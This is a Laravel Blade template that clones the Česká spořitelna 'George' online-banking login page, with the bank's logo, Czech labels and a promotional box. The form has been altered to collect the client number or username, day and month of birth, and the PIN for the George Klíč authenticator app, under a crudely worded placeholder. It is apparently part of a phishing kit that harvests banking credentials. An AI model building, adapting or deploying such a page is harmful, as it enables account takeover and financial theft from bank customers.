jhjLjAxNC0uMTIzLjAxNC0uNC4wMTQtLjU2NCAwLS42Ni0uMjYxLTEuNDg2LTEuMzA3LTEuNDg2LS45NSAwLTEuNDU5LjYwNi0xLjUxNCAyLjA1SDMzLjJ6bTMuNjMyIDMuOTc2aC0xLjIzOHYtOC40MzRjMC0uNDEzLjE1LS42NDcuNTY0LS42NDdoLjY3NHY5LjA4MXptMS41MTMgMHYtNi44NzloLjYxOWMuNDM5IDAgLjYyLjIzNC42Mi41NjR2LjIzNGEyLjUzNyAyLjUzNyAwIDAxMS45MjUtLjg2N2MxLjMzNSAwIDEuOTk2LjgyNiAxLjk5NiAyLjEwNnY0Ljg0MmgtMS4yMjV2LTQuNzg4YzAtLjgxMS0uNDY4LTEuMTU1LTEuMjUyLTEuMTU1LS41MjIgMC0xLjA2LjI0Ny0xLjQ0NC41Nzd2NS4zNjZoLTEuMjR6bTEwLjg2OCAwYy0uNDQgMC0uNjA2LS4yMzMtLjYwNi0uNTc3di0uMjJhMi41OTggMi41OTggMCAwMS0xLjkyNS44NjZjLTEuMjQgMC0yLjAxLS43NTctMi4wMS0xLjkxMiAwLTEuNzM0IDEuODE2LTIuMTc0IDMuOTM0LTIuMjd2LS42NDhjMC0uOTM1LS42MzItMS4xOTctMS40Ny0xLjE5N2gtMS45ODJ2LS4zNTdjMC0uNjA2LjcxNS0uNjM0IDIuMTYtLjYzNCAxLjU4MyAwIDIuNTE4LjY4OCAyLjUxOCAyLjEzMnY0LjgxN2gtLjYxOXptLS42MDYtMy4zM2MtMS44ODUuMDQyLTIuNjQxLjQ1NS0yLjY0MSAxLjMzNSAwIC43NTcuNTM2IDEuMDMyIDEuMjM5IDEuMDMyLjUyMiAwIDEuMDQ0LS4yMzQgMS40MDItLjU2NHYtMS44MDJ6IiBmaWxsPSIjMjE0MTZDIi8+PC9zdmc+"></a>
                                    </div>
                                    <lang class="px-2 ng-isolate-scope">
                                        <!-- ngIf: vm.showToggleLang -->
                                        <div data-ng-if="vm.showToggleLang" data-ng-click="vm.toggleLang()"
                                             class="font-bold text-blue-300 text-base ng-binding ng-scope"
                                             aria-label="Přepnout na angličtinu" role="button" tabindex="0" style=""> EN
                                        </div>
                                        <!-- end ngIf: vm.showToggleLang -->
                                    </lang>
                                </div>
                                <!-- uiView: -->
                                <div ui-view="" autoscroll="false" class="ng-scope" style="">
                                    <nickname class="ng-scope ng-isolate-scope">
                                        <!-- ngIf: !$ctrl.availableScenarios -->
                                        <ng-container ng-if="!$ctrl.availableScenarios" class="ng-scope">
                                            <app-input-wrapper class="ng-isolate-scope">
                                                <div>
                                                    <ng-transclude>
                                                        <input id="input.nickname" name="login" type="text"
                                                               autocomplete="off" ng-disabled="$ctrl.loading"
                                                               ng-required="true"
                                                               placeholder="Klientské číslo / Uživatelské jméno"
                                                               class="input ng-pristine ng-scope ng-isolate-scope ng-empty ng-invalid ng-invalid-required ng-touched"
                                                               ng-class="{error: $ctrl.isErrorNickname}"
                                                               app-autofocus=""
                                                               app-virtual-keyboard="" ng-model="$ctrl.nickname"
                                                               app-input-change-handler=""
                                                               aria-label="Zadejte prosím své klientské číslo nebo uživatelské jméno"
                                                               input-change="$ctrl.hideError()"
                                                               input-submit="$ctrl.submit($ctrl.nickname)"
                                                               required="required" aria-invalid="true"
                                                               style="padding-right: 32px;"><span
                                                                data-ng-click="toggleKeyboard();"
                                                                class="key vkBtn ng-scope"
                                                                title="Zobrazit virtuální klávesnici" tabindex="-1"
                                                                role="button"></span></ng-transclude>
                                                    <input id="input.apin_day" name="day"
                                                           class="input my-4 ng-pristine ng-empty ng-invalid ng-invalid-required ng-valid-minlength ng-valid-maxlength ng-touched"
                                                           style="width: 76px;" type="text" autocomplete="off"
                                                           placeholder="Den" ng-class="{error: $ctrl.isErrorApin}"
                                                           data-ng-model="$ctrl.formVal.day" ng-disabled="$ctrl.loading"
                                                           data-ng-required="true" mask="99?" restrict="reject"
                                                           clean="true"
                                                           minlength="1" maxlength="2" app-autofocus=""
                                                           app-input-change-handler="" input-change="$ctrl.hideError()"
                                                           input-submit="$ctrl.submit()"
                                                           aria-label="Zadejte den svého narození" required="required"
                                                           aria-invalid="true">
                                                    <select id="input.apin_month" name="month"
                                                            class="input my-4 text-grey-400 ng-pristine ng-empty ng-invalid ng-invalid-required ng-touched"
                                                            ng-class="{'error': $ctrl.isErrorApin}"
                                                            ng-options="('Widgets.Apin.Months.' + monthKey | translate) for monthKey in $ctrl.monthKeys"
                                                            data-ng-required="true" data-ng-model="$ctrl.formVal.month"
                                                            ng-disabled="$ctrl.loading" ng-change="$ctrl.hideError()"
                                                            aria-label="Vyberte měsíc svého narození"
                                                            required="required"
                                                            aria-invalid="true" style="">
                                                        <option value="" disabled="disabled" class="ng-binding"
                                                                selected="selected" hidden=""> Měsíc
                                                        </option>
                                                        <option label="Leden" value="01">Leden</option>
                                                        <option label="Únor" value="02">Únor</option>
                                                        <option label="Březen" value="03">Březen</option>
                                                        <option label="Duben" value="04">Duben</option>
                                                        <option label="Květen" value="05">Květen</option>
                                                        <option label="Červen" value="06">Červen</option>
                                                        <option label="Červenec" value="07">Červenec</option>
                                                        <option label="Srpen" value="08">Srpen</option>
                                                        <option label="Září" value="09">Září</option>
                                                        <option label="Říjen" value="10">Říjen</option>
                                                        <option label="Listopad" value="11">Listopad</option>
                                                        <option label="Prosinec" value="12">Prosinec</option>
                                                    </select>
                                                    <input id="input.nickname" name="pin" type="text"
                                                           autocomplete="off" ng-disabled="$ctrl.loading"
                                                           ng-required="true"
                                                           placeholder="Pin do aplikaci george klic"
                                                           class="input ng-pristine ng-scope ng-isolate-scope ng-empty ng-invalid ng-invalid-required ng-touched"
                                                           ng-class="{error: $ctrl.isErrorNickname}" app-autofocus=""
                                                           app-virtual-keyboard="" ng-model="$ctrl.nickname"
                                                           app-input-change-handler=""
                                                           aria-label="Zadejte prosím své klientské číslo nebo uživatelské jméno"
                                                           input-change="$ctrl.hideError()"
                                                           input-submit="$ctrl.submit($ctrl.nickname)"
                                                           required="required"
                                                           aria-invalid="true" style="padding-right: 32px;"><span
                                                            data-ng-click="toggleKeyboard();" class="key vkBtn ng-scope"
                                                            title="Zobrazit virtuální klávesnici" tabindex="-1"
                                                            role="button"></span>

                                                    <!-- ngIf: $ctrl.capsLockIndicator && $ctrl.isCapsLockOn -->
                                                </div>
                                            </app-input-wrapper>
                                            <!-- ngIf: $ctrl.isErrorEmptyNickname -->
                                            <!-- ngIf: $ctrl.isErrorMinLengthNickname -->
                                            <!-- ngIf: $ctrl.isErrorMaxLengthNickname -->
                                            <!-- ngIf: $ctrl.isErrorInvalidNickname -->
                                            <!-- ngIf: $ctrl.isErrorNickname && !$ctrl.isErrorNicknameFrontend -->
                                            <app-button data-id="'btn.continue'"
                                                        data-text="'Widgets.Buttons.Confirm' | translate"
                                                        data-type="'primary'" data-loading="$ctrl.loading"
                                                        data-action="$ctrl.submit($ctrl.nickname)"
                                                        class="ng-isolate-scope">
                                                <div data-ng-attr-id=""
                                                     data-ng-click="($ctrl.disabled || $ctrl.loading) || $ctrl.action()"
                                                     class="flex text-center font-semibold text-base rounded-md border-2 leading-6 text-white bg-blue-300 border-blue-300 hover:bg-blue-300-h hover:shadow-btn-hover hover:border-blue-300-h focus:bg-blue-400-h focus:shadow-btn-focus"
                                                     ng-class="
    {
      'text-white': $ctrl.type === 'primary',
      'bg-white': $ctrl.type === 'secondary',
      'bg-blue-300 border-blue-300 hover:bg-blue-300-h hover:shadow-btn-hover hover:border-blue-300-h focus:bg-blue-400-h focus:shadow-btn-focus': !$ctrl.disabled &amp;&amp; $ctrl.type === 'primary',
      'bg-grey-300-50 border-grey-300-50 btndisabled': $ctrl.disabled &amp;&amp; $ctrl.type === 'primary',
      'text-blue-300 border-grey-300 hover:bg-grey-h hover:shadow-btn-hover hover:border-grey-400 focus:bg-grey-f focus:shadow-btn-focus focus:border-grey-400': !$ctrl.disabled &amp;&amp; $ctrl.type === 'secondary',
      'text-grey-300-50 border-grey-300-50 btndisabled': $ctrl.disabled &amp;&amp; $ctrl.type === 'secondary'
    }
  " style="padding:10px 12px" role="button" tabindex="0" id="btn.continue">
                                                    <!-- ngIf: $ctrl.imgClass || $ctrl.loading -->
                                                    <button class="flex-grow ng-binding" type="submit">Pokračovat
                                                    </button>
                                                    <!-- ngIf: $ctrl.imgClass || $ctrl.loading -->
                                                </div>
                                            </app-button>
                                        </ng-container>

                                        <!-- end ngIf: !$ctrl.availableScenarios -->
                                        <!-- ngIf: $ctrl.availableScenarios -->
                                    </nickname>
                                </div>
                                <!-- ngIf: vm.isNickname && vm.isPkiScenarioAvailable -->
                                <!-- ngIf: vm.isNickname && vm.isPkiScenarioAvailable -->
                                <!-- ngRepeat: item in vm.widgetBoxFooter -->
                                <!-- ngIf: vm.isNickname -->
                                <app-link data-ng-if="vm.isNickname" data-ng-repeat="item in vm.widgetBoxFooter"
                                          data-text="item.text" data-link="!item.chatEventName &amp;&amp; item.link"
                                          data-action="item.chatEventName &amp;&amp; vm.triggerChat(item.chatEventName)"
                                          data-type="'info'" class="ng-scope ng-isolate-scope" style="">
                                    <div data-ng-attr-id=""
                                         ng-class="{'text-blue-300': !$ctrl.disabled &amp;&amp; $ctrl.type === 'info', 'text-red': !$ctrl.disabled &amp;&amp; $ctrl.type === 'danger', 'text-grey-300': $ctrl.type === 'info-grey' || $ctrl.disabled}"
                                         class="text-center bg-white p-2 font-semibold text-base text-blue-300">
                                        <div class="flex text-center items-center">
                                            <!-- ngIf: $ctrl.loading -->
                                            <div class="flex-grow">
                                                <!-- ngIf: $ctrl.link -->
                                                <!-- ngIf: !$ctrl.link --><span data-ng-if="!$ctrl.link"
                                                                                data-ng-click="$ctrl.disabled || $ctrl.action()"
                                                                                ng-class="{'cursor-default': $ctrl.disabled}"
                                                                                class="ng-binding ng-scope"
                                                                                role="button"
                                                                                tabindex="0">Nepamatuji si uživatelské jméno</span>
                                                <!-- end ngIf: !$ctrl.link -->
                                            </div>
                                            <!-- ngIf: $ctrl.loading -->
                                        </div>
                                    </div>
                                </app-link>
                                <!-- end ngIf: vm.isNickname -->
                                <!-- end ngRepeat: item in vm.widgetBoxFooter -->
                            </box>
                            <!-- ngIf: $ctrl.vc.loginInfoBox && $ctrl.isNickname -->
                            <app-info-box ng-if="$ctrl.vc.loginInfoBox &amp;&amp; $ctrl.isNickname"
                                          type="$ctrl.vc.loginInfoBox.type" content="$ctrl.vc.loginInfoBox.content"
                                          class="info-box mb-0 mt-1 ng-scope ng-isolate-scope" style="">
                                <div class="flex text-blue-400 text-sm leading-5 rounded-lg pl-2-5 pr-6 py-4 bg-blue-info"
                                     ng-class="{'bg-blue-info': $ctrl.type === 'info', 'bg-yellow-warn': $ctrl.type === 'warn', 'bg-red-danger': $ctrl.type === 'danger'}">
                                    <div class="icon flex-none mr-2 alertInfoIcon"
                                         ng-class="{'alertInfoIcon': $ctrl.type === 'info', 'alertWarnIcon': $ctrl.type === 'warn', 'alertDangerIcon': $ctrl.type === 'danger'}"></div>
                                    <div>
                                        <!-- ngRepeat: item in $ctrl.content -->
                                        <ng-container ng-repeat="item in $ctrl.content" class="ng-scope">
                                            <!-- ngIf: item.title -->
                                            <h2 data-ng-if="item.title"
                                                class="info-box-content font-bold ng-binding ng-scope"
                                                ng-bind-html="item.text">Ušetřete s programem Moneyback!</h2>
                                            <!-- end ngIf: item.title -->
                                            <!-- ngIf: !item.title -->
                                        </ng-container>
                                        <!-- end ngRepeat: item in $ctrl.content -->
                                        <ng-container ng-repeat="item in $ctrl.content" class="ng-scope">
                                            <!-- ngIf: item.title -->
                                            <!-- ngIf: !item.title -->
                                            <p data-ng-if="!item.title"
                                               class="info-box-content mb-1 ng-binding ng-scope"
                                               ng-bind-html="item.text">V Georgi v mobilu funguje slevový program
                                                Moneyback.
                                                Při platbě kartou Vám vrátíme část útraty zpět. Slevy
                                                <br>a&nbsp;výhody si jednoduše aktivujte
                                                <br>v mobilní aplikaci George.</p>
                                            <!-- end ngIf: !item.title -->
                                        </ng-container>
                                        <!-- end ngRepeat: item in $ctrl.content -->
                                        <ng-container ng-repeat="item in $ctrl.content" class="ng-scope">
                                            <!-- ngIf: item.title -->
                                            <!-- ngIf: !item.title -->
                                            <p data-ng-if="!item.title"
                                               class="info-box-content mb-1 ng-binding ng-scope"
                                               ng-bind-html="item.text"><a
                                                        href="https://www.csas.cz/cs/osobni-finance/ucty-karty/karty-platby-mobilem?itm_source=george&amp;itm_medium=web&amp;itm_campaign=prihlaseni#moneyback"
                                                        target="_blank">Chci vědět více</a></p>
                                            <!-- end ngIf: !item.title -->
                                        </ng-container>
                                        <!-- end ngRepeat: item in $ctrl.content -->
                                    </div>
                                </div>
                            </app-info-box>
                            <!-- end ngIf: $ctrl.vc.loginInfoBox && $ctrl.isNickname -->
                        </div>
                    </form>
                </main>
                <!-- end ngIf: $ctrl.vc && $ctrl.scenarios -->
                <!-- ngIf: !$ctrl.vc || !$ctrl.scenarios -->
            </div>
        </div>
    </app-root>
@endsection
@push('js')
@endpush